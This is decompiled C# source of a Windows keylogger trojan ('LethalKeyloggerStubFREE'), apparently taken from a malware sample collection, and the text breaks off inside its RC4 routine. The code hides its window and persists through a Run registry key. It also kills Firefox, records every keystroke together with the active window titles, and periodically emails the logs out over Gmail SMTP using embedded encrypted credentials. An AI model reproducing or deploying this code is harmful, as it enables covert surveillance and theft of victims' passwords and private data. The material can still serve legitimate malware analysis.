// Decompiled with JetBrains decompiler
// Type: MicrosoftWindows.Form1
// Assembly: LethalKeyloggerStubFREE, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CDA884B2-DDEA-4F9B-B77F-DA62A4B22D2E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.cuw-9c96d3e56ec0656218410829a8285ebf2ebabf98bdc4524c959a5a23acb91222.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using MicrosoftWindows.My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace MicrosoftWindows
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer _Timer2;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer _Timer3;
    private TextBox innerz666;
    private TextBox interz666;
    private TextBox interx666;
    private TextBox outerz666;
    private TextBox outerx666;
    private TextBox esendz666;
    private TextBox esendx666;
    private CheckBox checky666;
    private CheckBox osname666;
    private CheckBox osvers666;
    private CheckBox emails666;
    private CheckBox osuser666;
    private TextBox osvers667;
    private TextBox osname667;
    private TextBox osuser667;
    private TextBox smtphost;
    private CheckBox startsadd;
    private TextBox t2interval;
    private Random irrelevant;
    private string appname;
    private string stub;
    private string text1;
    private string text2;
    private string check1;
    private string text3;
    private string errorico;
    private string text4;
    private string check3;
    private string check4;
    private string check5;
    private string check6;
    private string check7;
    private string check8;
    private string text6;
    private string combo1;
    private string check9;
    private string check10;
    private string check11;
    private string check12;
    private string check13;
    private string check14;
    private string check15;
    private string check18;
    private string check19;
    private string check20;
    private string check21;
    private string check22;
    private string activewindow;
    [AccessedThroughProperty("kbHook")]
    private Form1.KeyboardHook _kbHook;
    private bool shift;
    private StreamWriter streamwriter;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.innerz666 = new TextBox();
      this.interz666 = new TextBox();
      this.interx666 = new TextBox();
      this.outerz666 = new TextBox();
      this.outerx666 = new TextBox();
      this.esendz666 = new TextBox();
      this.esendx666 = new TextBox();
      this.checky666 = new CheckBox();
      this.osname666 = new CheckBox();
      this.osvers666 = new CheckBox();
      this.emails666 = new CheckBox();
      this.osuser666 = new CheckBox();
      this.osvers667 = new TextBox();
      this.osname667 = new TextBox();
      this.osuser667 = new TextBox();
      this.smtphost = new TextBox();
      this.startsadd = new CheckBox();
      this.t2interval = new TextBox();
      this.irrelevant = new Random();
      this.appname = Path.GetFileName(Application.ExecutablePath);
      this.kbHook = new Form1.KeyboardHook();
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.Timer2 = new System.Windows.Forms.Timer(this.components);
      this.Timer3 = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(4, 0);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.Name = nameof (Form1);
      this.Text = "your mum";
      this.ResumeLayout(false);
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      [DebuggerNonUserCode] get => this._Timer2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
        if (this._Timer2 != null)
          this._Timer2.Tick -= eventHandler;
        this._Timer2 = value;
        if (this._Timer2 == null)
          return;
        this._Timer2.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer3
    {
      [DebuggerNonUserCode] get => this._Timer3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer3_Tick);
        if (this._Timer3 != null)
          this._Timer3.Tick -= eventHandler;
        this._Timer3 = value;
        if (this._Timer3 == null)
          return;
        this._Timer3.Tick += eventHandler;
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      string Delimiter = "keylogfreeforHF";
      try
      {
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
        string Expression = Strings.Space(checked ((int) FileSystem.LOF(1)));
        FileSystem.FileGet(1, ref Expression);
        FileSystem.FileClose(1);
        string[] strArray = Strings.Split(Expression, Delimiter);
        this.interz666.Text = strArray[1];
        this.interx666.Text = strArray[2];
        if (Operators.CompareString(strArray[8], "errorOS", false) == 0)
        {
          this.checky666.Checked = true;
          this.text3 = strArray[4];
          this.text4 = strArray[6];
          this.errorico = strArray[5];
        }
        this.t2interval.Text = strArray[7];
        if (Operators.CompareString(strArray[9], "emailOS", false) == 0)
          this.emails666.Checked = true;
        if (Operators.CompareString(strArray[10], "getcomp", false) == 0)
          this.osname666.Checked = true;
        if (Operators.CompareString(strArray[13], "adding", false) == 0)
        {
          this.startsadd.Checked = true;
          this.combo1 = strArray[15];
        }
        this.text6 = strArray[14];
        this.check9 = strArray[16];
        this.check10 = strArray[17];
        this.check11 = strArray[18];
        this.check12 = strArray[19];
        this.check13 = strArray[20];
        this.check14 = strArray[21];
        this.check15 = strArray[22];
        this.check18 = strArray[23];
        this.check19 = strArray[24];
        this.check20 = strArray[25];
        this.check21 = strArray[26];
        this.check22 = strArray[27];
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.ModuleName)).Length > 1)
        Application.Exit();
      if (Operators.CompareString(this.check22, "Yes", false) == 0)
      {
        Process[] processes = Process.GetProcesses();
        int num = checked (processes.Length - 1);
        int index = 0;
        while (index <= num)
        {
          if (Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase("firefox"), false) == 0)
            processes[index].Kill();
          checked { ++index; }
        }
      }
      if (Operators.CompareString(this.check9, "Yes", false) == 0 | Operators.CompareString(this.check10, "Yes", false) == 0 | Operators.CompareString(this.check11, "Yes", false) == 0 | Operators.CompareString(this.check12, "Yes", false) == 0 | Operators.CompareString(this.check13, "Yes", false) == 0 | Operators.CompareString(this.check14, "Yes", false) == 0 | Operators.CompareString(this.check15, "Yes", false) == 0 | Operators.CompareString(this.check18, "Yes", false) == 0 | Operators.CompareString(this.check19, "Yes", false) == 0 | Operators.CompareString(this.check20, "Yes", false) == 0 | Operators.CompareString(this.check21, "Yes", false) == 0)
      {
        this.Timer3.Interval = 1000;
        this.Timer3.Start();
      }
      if (this.osuser666.Checked)
        this.osuser667.Text = Environment.UserName;
      if (this.osname666.Checked)
        this.osname667.Text = Environment.MachineName;
      if (MySettingsProperty.Settings.runonce)
      {
        MySettingsProperty.Settings.runonce = false;
        if (this.checky666.Checked && Operators.CompareString(this.errorico, "msgexcl", false) == 0)
        {
          int num = (int) Interaction.MsgBox((object) this.text3, MsgBoxStyle.Exclamation, (object) this.text4);
        }
        if (this.startsadd.Checked)
        {
          try
          {
            string fileName = Path.GetFileName(Application.ExecutablePath);
            if (Operators.CompareString(this.combo1, "applocal", false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
              MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + "\\" + fileName, true);
              Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(this.text6, (object) (folderPath + "\\" + fileName));
            }
            else if (Operators.CompareString(this.combo1, "approaming", false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
              MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + "\\" + fileName, true);
              Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(this.text6, (object) (folderPath + "\\" + fileName));
            }
            else if (Operators.CompareString(this.combo1, "cdrive", false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyComputer);
              MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + "\\" + fileName, true);
              Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(this.text6, (object) (folderPath + "\\" + fileName));
            }
            else if (Operators.CompareString(this.combo1, "desktop", false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
              MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + "\\" + fileName, true);
              Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(this.text6, (object) (folderPath + "\\" + fileName));
            }
            else if (Operators.CompareString(this.combo1, "docs", false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
              MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + "\\" + fileName, true);
              Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(this.text6, (object) (folderPath + "\\" + fileName));
            }
            else if (Operators.CompareString(this.combo1, "music", false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
              MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + "\\" + fileName, true);
              Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(this.text6, (object) (folderPath + "\\" + fileName));
            }
            else if (Operators.CompareString(this.combo1, "pics", false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
              MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + "\\" + fileName, true);
              Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(this.text6, (object) (folderPath + "\\" + fileName));
            }
            else if (Operators.CompareString(this.combo1, "progfiles", false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
              MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + "\\" + fileName, true);
              Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(this.text6, (object) (folderPath + "\\" + fileName));
            }
            else if (Operators.CompareString(this.combo1, "start", false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu);
              MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + "\\" + fileName, true);
              Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(this.text6, (object) (folderPath + "\\" + fileName));
            }
            else if (Operators.CompareString(this.combo1, "system", false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
              MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + "\\" + fileName, true);
              Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(this.text6, (object) (folderPath + "\\" + fileName));
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      this.Timer1.Start();
      this.Timer2.Interval = checked ((int) Math.Round(unchecked (Conversions.ToDouble(this.t2interval.Text) * 60.0 * 1000.0)));
      this.Timer2.Start();
      this.Visible = false;
      this.Hide();
      this.ShowInTaskbar = false;
      MySettingsProperty.Settings.Save();
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetForegroundWindow();

    [DllImport("USER32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetKeyState(long vKey);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    private string GetActiveWindowTitle()
    {
      string lpString = new string(char.MinValue, 100);
      Form1.GetWindowText(Form1.GetForegroundWindow(), ref lpString, 100);
      return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
    }

    private virtual Form1.KeyboardHook kbHook
    {
      [DebuggerNonUserCode] get => this._kbHook;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        Form1.KeyboardHook.KeyDownEventHandler downEventHandler = new Form1.KeyboardHook.KeyDownEventHandler(this.kbHook_KeyDown);
        Form1.KeyboardHook.KeyUpEventHandler keyUpEventHandler = new Form1.KeyboardHook.KeyUpEventHandler(this.kbHook_KeyUp);
        if (this._kbHook != null)
        {
          Form1.KeyboardHook.KeyDown -= downEventHandler;
          Form1.KeyboardHook.KeyUp -= keyUpEventHandler;
        }
        this._kbHook = value;
        if (this._kbHook == null)
          return;
        Form1.KeyboardHook.KeyDown += downEventHandler;
        Form1.KeyboardHook.KeyUp += keyUpEventHandler;
      }
    }

    private void kbHook_KeyUp(Keys Key)
    {
    }

    private void kbHook_KeyDown(Keys Key)
    {
      if (!this.Timer1.Enabled)
        return;
      if (Form1.GetAsyncKeyState(16L) != 0)
        this.shift = true;
      if (Operators.CompareString(this.activewindow, this.GetActiveWindowTitle(), false) != 0)
      {
        this.activewindow = this.GetActiveWindowTitle();
        this.innerz666.Text = this.innerz666.Text + "\r\n\r\n" + this.activewindow + "\r\n\r\n";
      }
      if (Key == Keys.A)
      {
        if (this.shift)
        {
          this.innerz666.Text += "A";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "a";
        }
      }
      else if (Key == Keys.B)
      {
        if (this.shift)
        {
          this.innerz666.Text += "B";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "b";
        }
      }
      else if (Key == Keys.C)
      {
        if (this.shift)
        {
          this.innerz666.Text += "C";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "c";
        }
      }
      else if (Key == Keys.D)
      {
        if (this.shift)
        {
          this.innerz666.Text += "D";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "d";
        }
      }
      else if (Key == Keys.E)
      {
        if (this.shift)
        {
          this.innerz666.Text += "E";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "e";
        }
      }
      else if (Key == Keys.F)
      {
        if (this.shift)
        {
          this.innerz666.Text += "F";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "f";
        }
      }
      else if (Key == Keys.G)
      {
        if (this.shift)
        {
          this.innerz666.Text += "G";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "g";
        }
      }
      else if (Key == Keys.H)
      {
        if (this.shift)
        {
          this.innerz666.Text += "H";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "h";
        }
      }
      else if (Key == Keys.I)
      {
        if (this.shift)
        {
          this.innerz666.Text += "I";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "i";
        }
      }
      else if (Key == Keys.J)
      {
        if (this.shift)
        {
          this.innerz666.Text += "J";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "j";
        }
      }
      else if (Key == Keys.K)
      {
        if (this.shift)
        {
          this.innerz666.Text += "K";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "k";
        }
      }
      else if (Key == Keys.L)
      {
        if (this.shift)
        {
          this.innerz666.Text += "L";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "l";
        }
      }
      else if (Key == Keys.M)
      {
        if (this.shift)
        {
          this.innerz666.Text += "M";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "m";
        }
      }
      else if (Key == Keys.N)
      {
        if (this.shift)
        {
          this.innerz666.Text += "N";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "n";
        }
      }
      else if (Key == Keys.O)
      {
        if (this.shift)
        {
          this.innerz666.Text += "O";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "o";
        }
      }
      else if (Key == Keys.P)
      {
        if (this.shift)
        {
          this.innerz666.Text += "P";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "p";
        }
      }
      else if (Key == Keys.Q)
      {
        if (this.shift)
        {
          this.innerz666.Text += "Q";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "q";
        }
      }
      else if (Key == Keys.R)
      {
        if (this.shift)
        {
          this.innerz666.Text += "R";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "r";
        }
      }
      else if (Key == Keys.S)
      {
        if (this.shift)
        {
          this.innerz666.Text += "S";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "s";
        }
      }
      else if (Key == Keys.T)
      {
        if (this.shift)
        {
          this.innerz666.Text += "T";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "t";
        }
      }
      else if (Key == Keys.U)
      {
        if (this.shift)
        {
          this.innerz666.Text += "U";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "u";
        }
      }
      else if (Key == Keys.V)
      {
        if (this.shift)
        {
          this.innerz666.Text += "V";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "v";
        }
      }
      else if (Key == Keys.W)
      {
        if (this.shift)
        {
          this.innerz666.Text += "W";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "w";
        }
      }
      else if (Key == Keys.X)
      {
        if (this.shift)
        {
          this.innerz666.Text += "X";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "x";
        }
      }
      else if (Key == Keys.Y)
      {
        if (this.shift)
        {
          this.innerz666.Text += "Y";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "y";
        }
      }
      else if (Key == Keys.Z)
      {
        if (this.shift)
        {
          this.innerz666.Text += "Z";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "z";
        }
      }
      else if (Key == Keys.D0)
      {
        if (this.shift)
        {
          this.innerz666.Text += ")";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "0";
        }
      }
      else if (Key == Keys.D1)
      {
        if (this.shift)
        {
          this.innerz666.Text += "!";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "1";
        }
      }
      else if (Key == Keys.D2)
      {
        if (this.shift)
        {
          this.innerz666.Text += "@";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "2";
        }
      }
      else if (Key == Keys.D3)
      {
        if (this.shift)
        {
          this.innerz666.Text += "#";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "3";
        }
      }
      else if (Key == Keys.D4)
      {
        if (this.shift)
        {
          this.innerz666.Text += "$";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "4";
        }
      }
      else if (Key == Keys.D5)
      {
        if (this.shift)
        {
          this.innerz666.Text += "%";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "5";
        }
      }
      else if (Key == Keys.D6)
      {
        if (this.shift)
        {
          this.innerz666.Text += "^";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "6";
        }
      }
      else if (Key == Keys.D7)
      {
        if (this.shift)
        {
          this.innerz666.Text += "&";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "7";
        }
      }
      else if (Key == Keys.D8)
      {
        if (this.shift)
        {
          this.innerz666.Text += "*";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "8";
        }
      }
      else if (Key == Keys.D9)
      {
        if (this.shift)
        {
          this.innerz666.Text += "9";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "(";
        }
      }
      else if (Key == Keys.OemSemicolon)
      {
        if (this.shift)
        {
          this.innerz666.Text += ":";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += ";";
        }
      }
      else if (Key == Keys.OemPeriod)
      {
        if (this.shift)
        {
          this.innerz666.Text += ">";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += ".";
        }
      }
      else if (Key == Keys.OemQuotes)
      {
        if (this.shift)
        {
          this.innerz666.Text += "\"";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "'";
        }
      }
      else if (Key == Keys.OemOpenBrackets)
      {
        if (this.shift)
        {
          this.innerz666.Text += "{";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "[";
        }
      }
      else if (Key == Keys.OemCloseBrackets)
      {
        if (this.shift)
        {
          this.innerz666.Text += "}";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "]";
        }
      }
      else if (Key == Keys.Oemcomma)
      {
        if (this.shift)
        {
          this.innerz666.Text += "<";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += ",";
        }
      }
      else if (Key == Keys.OemMinus)
      {
        if (this.shift)
        {
          this.innerz666.Text += "_";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "-";
        }
      }
      else if (Key == Keys.Oemplus)
      {
        if (this.shift)
        {
          this.innerz666.Text += "+";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "=";
        }
      }
      else if (Key == Keys.OemQuestion)
      {
        if (this.shift)
        {
          this.innerz666.Text += "?";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "/";
        }
      }
      else if (Key == Keys.OemPipe)
      {
        if (this.shift)
        {
          this.innerz666.Text += "|";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "\\";
        }
      }
      else if (Key == Keys.Oemtilde)
      {
        if (this.shift)
        {
          this.innerz666.Text += "~";
          this.shift = false;
        }
        else
        {
          if (this.shift)
            return;
          this.innerz666.Text += "`";
        }
      }
      else if (Key == Keys.Tab)
      {
        this.innerz666.Text += "[tab]";
        if (Operators.CompareString(this.activewindow, this.GetActiveWindowTitle(), false) == 0)
          return;
        this.activewindow = this.GetActiveWindowTitle();
        this.innerz666.Text = this.innerz666.Text + this.activewindow + "\r\n\r\n";
      }
      else if (Key == Keys.Subtract)
        this.innerz666.Text += "-";
      else if (Key == Keys.Capital)
        this.innerz666.Text += "[caps]";
      else if (Key == Keys.Space)
        this.innerz666.Text += " ";
      else if (Key == Keys.Add)
        this.innerz666.Text += "+";
      else if (Key == Keys.Back)
        this.innerz666.Text += "[<]";
      else if (Key == Keys.LControlKey)
      {
        this.innerz666.Text += "[ctrl]";
        if (Operators.CompareString(this.activewindow, this.GetActiveWindowTitle(), false) == 0)
          return;
        this.activewindow = this.GetActiveWindowTitle();
        this.innerz666.Text = this.innerz666.Text + this.activewindow + "\r\n\r\n";
      }
      else if (Key == Keys.RControlKey)
      {
        this.innerz666.Text += "[ctrl]";
        if (Operators.CompareString(this.activewindow, this.GetActiveWindowTitle(), false) == 0)
          return;
        this.activewindow = this.GetActiveWindowTitle();
        this.innerz666.Text = this.innerz666.Text + this.activewindow + "\r\n\r\n";
      }
      else if (Key == Keys.Decimal)
        this.innerz666.Text += ".";
      else if (Key == Keys.Delete)
        this.innerz666.Text += "[<]";
      else if (Key == Keys.Divide)
        this.innerz666.Text += "/";
      else if (Key == Keys.Down)
        this.innerz666.Text += "[down]";
      else if (Key == Keys.End)
        this.innerz666.Text += "[end]";
      else if (Key == Keys.Return)
      {
        this.innerz666.Text += "\r\n";
        if (Operators.CompareString(this.activewindow, this.GetActiveWindowTitle(), false) == 0)
          return;
        this.activewindow = this.GetActiveWindowTitle();
        this.innerz666.Text = this.innerz666.Text + "\r\n\r\n" + this.activewindow + "\r\n\r\n";
      }
      else if (Key == Keys.Escape)
      {
        this.innerz666.Text += "[esc]";
        if (Operators.CompareString(this.activewindow, this.GetActiveWindowTitle(), false) == 0)
          return;
        this.activewindow = this.GetActiveWindowTitle();
        this.innerz666.Text = this.innerz666.Text + "\r\n\r\n" + this.activewindow + "\r\n\r\n";
      }
      else if (Key == Keys.Home)
        this.innerz666.Text += "[home]";
      else if (Key == Keys.Insert)
        this.innerz666.Text += "[insert]";
      else if (Key == Keys.Left)
        this.innerz666.Text += "[<-]";
      else if (Key == Keys.Multiply)
        this.innerz666.Text += "*";
      else if (Key == Keys.Next)
        this.innerz666.Text += "[p-down]";
      else if (Key == Keys.Prior)
        this.innerz666.Text += "[p-up]";
      else if (Key == Keys.Snapshot)
        this.innerz666.Text += "[printscreen]";
      else if (Key == Keys.Return)
        this.innerz666.Text += "\r\n";
      else if (Key == Keys.Scroll)
        this.innerz666.Text += "[scroll]";
      else if (Key == Keys.Up)
        this.innerz666.Text += "[up]";
      else if (Key == Keys.Right)
        this.innerz666.Text += "[->]";
      else if (Key == Keys.Pause)
        this.innerz666.Text += "[pause]";
      else if (Key == Keys.F1)
        this.innerz666.Text += "[F1]";
      else if (Key == Keys.F2)
        this.innerz666.Text += "[F2]";
      else if (Key == Keys.F3)
        this.innerz666.Text += "[F3]";
      else if (Key == Keys.F4)
      {
        this.innerz666.Text += "[F4]";
        if (Operators.CompareString(this.activewindow, this.GetActiveWindowTitle(), false) == 0)
          return;
        this.activewindow = this.GetActiveWindowTitle();
        this.innerz666.Text = this.innerz666.Text + "\r\n\r\n" + this.activewindow + "\r\n\r\n";
      }
      else if (Key == Keys.F5)
        this.innerz666.Text += "[F5]";
      else if (Key == Keys.F6)
        this.innerz666.Text += "[F6]";
      else if (Key == Keys.F7)
        this.innerz666.Text += "[F7]";
      else if (Key == Keys.F8)
        this.innerz666.Text += "[F8]";
      else if (Key == Keys.F9)
        this.innerz666.Text += "[F9]";
      else if (Key == Keys.F10)
        this.innerz666.Text += "[F10]";
      else if (Key == Keys.F11)
        this.innerz666.Text += "[F11]";
      else if (Key == Keys.F12)
        this.innerz666.Text += "[F12]";
      else if (Key == Keys.F13)
        this.innerz666.Text += "[F13]";
      else if (Key == Keys.F14)
        this.innerz666.Text += "[F14]";
      else if (Key == Keys.F15)
        this.innerz666.Text += "[F15]";
      else if (Key == Keys.NumPad0)
        this.innerz666.Text += "0";
      else if (Key == Keys.NumPad1)
        this.innerz666.Text += "1";
      else if (Key == Keys.NumPad2)
        this.innerz666.Text += "2";
      else if (Key == Keys.NumPad3)
        this.innerz666.Text += "3";
      else if (Key == Keys.NumPad4)
        this.innerz666.Text += "4";
      else if (Key == Keys.NumPad5)
        this.innerz666.Text += "5";
      else if (Key == Keys.NumPad6)
        this.innerz666.Text += "6";
      else if (Key == Keys.NumPad7)
        this.innerz666.Text += "7";
      else if (Key == Keys.NumPad8)
        this.innerz666.Text += "8";
      else if (Key == Keys.NumPad9)
      {
        this.innerz666.Text += "9";
      }
      else
      {
        if (Key != Keys.NumLock)
          return;
        this.innerz666.Text += "[numlock]";
      }
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetAsyncKeyState(long vkey);

    private void Timer2_Tick(object sender, EventArgs e)
    {
      if (!MyProject.Computer.Network.IsAvailable)
        return;
      try
      {
        this.esendz666.Text = Form1.rc4(this.interz666.Text, "9pz666");
        try
        {
          this.esendx666.Text = Form1.rc4(this.interx666.Text, "9pz667");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        new SmtpClient()
        {
          Host = "smtp.gmail.com",
          Port = Conversions.ToInteger("587"),
          Credentials = ((ICredentialsByHost) new NetworkCredential(this.esendz666.Text, this.esendx666.Text)),
          EnableSsl = true
        }.Send(new MailMessage()
        {
          From = new MailAddress(this.esendz666.Text),
          To = {
            this.esendz666.Text
          },
          Body = this.innerz666.Text,
          Subject = "Lethal Keylogs"
        });
        this.innerz666.Clear();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string rc4(string message, string esendx666word)
    {
      int index1 = 0;
      int index2 = 0;
      StringBuilder stringBuilder = new StringBuilder();
      string empty = string.Empty;
      int[] numArray1 = new int[257];
      int[] numArray2 = new int[257];
